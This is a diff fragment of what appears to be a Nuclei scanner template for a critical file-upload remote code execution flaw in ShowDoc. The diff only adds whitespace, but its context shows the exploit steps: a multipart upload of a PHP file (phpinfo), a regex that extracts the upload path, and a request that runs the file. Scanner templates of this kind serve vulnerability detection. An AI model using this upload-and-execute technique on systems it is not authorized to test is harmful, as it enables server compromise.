@@ -5,6 +5,7 @@ info:
   severity: critical
   reference: https://github.com/star7th/showdoc/pull/1059
   tags: rce,fileupload,showdoc
+
 requests:
   - raw:
       - |
@@ -21,10 +22,12 @@ requests:
 
         <?php phpinfo();?>
         ----------------------------835846770881083140190633--
+
       - |
         GET /Public/Uploads{{url_decode("§path§")}} HTTP/1.1
         Host: {{Hostname}}
         Origin: {{BaseURL}}
+
     extractors:
       - type: regex
         name: path
@@ -33,6 +36,7 @@ requests:
         part: body
         regex:
           - '/Uploads\\(.*?)"\,"success"'
+
     req-condition: true
     matchers:
       - type: dsl
